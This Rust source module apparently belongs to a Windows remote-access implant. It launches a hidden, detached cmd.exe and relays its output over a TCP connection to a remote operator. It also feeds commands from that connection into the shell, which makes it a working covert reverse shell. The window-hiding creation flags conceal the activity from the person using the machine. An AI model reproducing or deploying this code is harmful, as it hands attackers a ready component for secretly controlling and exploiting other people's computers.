use std::io::Write;
use std::os::windows::process::CommandExt;
use std::process::Child;
use std::net::TcpStream;
use std::sync::{Arc, Mutex};

use crate::handler::{read_buffer, write_bytes};

pub fn start_shell(write_stream: Arc<Mutex<TcpStream>>, remote_shell: &mut Option<Child>) {
    const DETACH: u32 = 0x00000008;
    const HIDE: u32 = 0x08000000;

    *remote_shell = Some(std::process::Command::new("cmd")
        .creation_flags(HIDE | DETACH)
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .unwrap());

        if let Some(shell) = remote_shell {
            if let Some(stdout) = shell.stdout.take() {
                std::thread::spawn(move || {
                    let mut cmd_output = stdout;
                    
                    loop {
                        let read_result = read_buffer(&mut cmd_output);
                        match read_result {
                            Ok(vec) => {
                                let output_str = String::from("shellout:") + &String::from_utf8_lossy(&vec);
                                let mut ws_lock = write_stream.lock().unwrap();
                                write_bytes(&mut ws_lock, output_str.as_bytes());
                            },
                            Err(_) => {
                                eprintln!("Error reading from shell stdout or end of file.");
                                break;
                            }
                        }
                    }
                });
            }
        }
}

pub fn exit_shell(remote_shell: &mut Option<Child>) {
    if let Some(shell) = remote_shell {
        if let Some(stdin) = shell.stdin.as_mut() {
            let _ = stdin.write_all(b"exit\n");
            let _ = stdin.flush();
        }
    }
}

pub fn execute_shell_command(remote_shell: &mut Option<Child>, command: &str) {
    if let Some(shell) = remote_shell {
        if let Some(stdin) = shell.stdin.as_mut() {
            let _ = stdin.write_all(format!("{}\n", command).as_bytes());
            let _ = stdin.flush();
        }
    }
}